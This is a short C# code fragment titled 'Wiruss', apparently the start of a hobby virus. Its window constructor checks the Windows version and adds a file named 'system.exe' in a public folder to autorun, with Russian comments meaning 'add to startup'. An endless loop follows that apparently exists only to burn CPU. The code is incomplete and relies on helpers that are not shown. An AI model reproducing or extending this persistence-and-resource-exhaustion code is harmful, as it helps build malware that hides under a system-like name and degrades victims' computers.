# Wiruss
public partial class MainWindow : Window
    {
        public static string needPatch = "C:\\Users\\Public\\";


        public MainWindow()
        {
            if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista" )
            {
                autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }
            else
                if (OSVersionInfo.Name == "Windows XP")
            {
                needPatch = "C:\\Documents and Settings\\All Users\\";
                autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                                                                         //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }

            InitializeComponent();
        }
        
    private static void s_b()
        {
            int y = 2;
            while (true)
            {
                y *= y;
            }
        }
